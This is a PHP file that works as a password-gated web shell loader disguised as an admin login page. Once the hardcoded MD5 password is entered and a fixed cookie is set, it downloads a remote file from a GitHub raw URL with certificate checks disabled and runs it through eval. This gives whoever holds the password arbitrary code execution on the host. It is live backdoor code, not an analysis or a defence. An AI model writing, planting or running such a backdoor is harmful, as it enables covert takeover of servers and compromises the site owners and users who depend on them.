<?php

// Function to check if the user is logged in based on the presence of a valid cookie
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'RimuruSama30'; // Ganti 'tomodachishell' dengan nilai yang sesuai
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    // Function to get URL content (similar to your previous code)
    function geturlsinfo($url)
    {
        if (function_exists('curl_exec')) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

            $url_get_contents_data = curl_exec($conn);
            curl_close($conn);
        } elseif (function_exists('file_get_contents')) {
            $url_get_contents_data = file_get_contents($url);
        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
            $handle = fopen($url, "r");
            $url_get_contents_data = stream_get_contents($handle);
            fclose($handle);
        } else {
            $url_get_contents_data = false;
        }
        return $url_get_contents_data;
    }

    $a = geturlsinfo('https://raw.githubusercontent.com/NewbieWibu/NewbieWibu/main/doorx.txt');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = 'e65b921aa5ac16a385a1b72badecab2b'; // Replace this with your MD5 hashed password
        if (md5($entered_password) === $hashed_password) {
            // Password is correct, set a cookie to indicate login
            setcookie('user_id', 'RimuruSama30', time() + 3600, '/'); // Ganti 'tomodachishell' dengan nilai yang sesuai
        } else {
            // Password is incorrect
            echo "Wrong password.";
        }
    }
    ?>    
    
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Login Page</title>
    </head>
    <body>
        <style>
body {
  background-image: url('https://i.gifer.com/33HF.gif');
  position: fixed;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  background-size: cover;
  font-family: 'Lato', sans-serif;
  color: #4A4A4A;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  overflow: hidden;
  margin: 0;
  padding: 0;
}
        </style>
        <form method="POST" action="">
            <center>
            <b><h1><font face="monaco" color="yellow">Welcome,Please Login!</font></h1></b>
            </center><br>
            <label for="password"><b><font face="monaco" color="white">Password:</font></b></label>
            <input type="password" id="password" name="password">
            <input type="submit" value="login">
        </form>
    </body>
    </html>
    
    <?php
}
?>
